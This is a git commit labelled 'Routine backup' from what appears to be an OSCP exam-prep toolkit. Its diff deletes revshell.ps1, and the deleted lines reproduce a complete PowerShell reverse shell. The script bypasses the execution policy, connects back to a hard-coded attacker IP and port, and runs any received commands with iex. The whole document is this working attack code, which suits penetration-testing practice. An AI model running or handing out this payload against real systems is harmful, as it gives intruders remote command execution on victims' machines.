e773a4bad98dcfec8f09e1e61813053c8485a592
cyB3Rsa1l0r <cybersailor.war@gmail.com>
2025-09-30 08:10:04 -0400

    Routine backup

--- other-OSCP-Tools/KKtools/kktools-2/revshell.ps1
+++
@@ -1,3 +0,0 @@
-set myip=192.168.45.184
-set myport=40443
-powershell.exe -ExecutionPolicy Bypass -noLogo -Command "$client = New-Object System.Net.Sockets.TCPClient('%myip%',%myport%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
